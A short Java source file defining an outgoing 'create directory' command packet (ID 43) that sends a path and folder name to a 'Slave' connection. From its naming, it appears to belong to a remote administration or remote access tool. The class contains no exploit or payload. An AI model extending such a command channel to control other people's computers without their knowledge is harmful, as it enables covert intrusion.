package com.redpois0n.packets.outgoing;

import java.io.DataOutputStream;

import com.redpois0n.Slave;

public class Packet43CreateDirectory extends AbstractOutgoingPacket {
	
	private String dir;
	private String name;
	
	public Packet43CreateDirectory(String dir, String name) {
		this.dir = dir;
		this.name = name;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		slave.writeLine(dir);
		slave.writeLine(name);
	}

	@Override
	public byte getPacketId() {
		return 43;
	}

}
